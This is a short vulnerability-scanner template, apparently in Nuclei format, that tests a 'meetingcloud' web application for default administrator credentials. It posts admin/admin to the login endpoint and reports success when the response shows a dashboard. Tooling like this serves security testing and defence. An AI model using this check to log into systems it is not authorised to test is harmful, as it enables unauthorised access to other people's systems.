
id: meetingcloud-default-login

info:
  name: msk-template
  author: msk
  severity: high

http:
  - raw:
      - |
        POST /meetingcloud/web/loginByPassword HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Encoding: gzip, deflate
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        user=admin&password=admin&loginType=2

    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"meetingcloud","dashboard")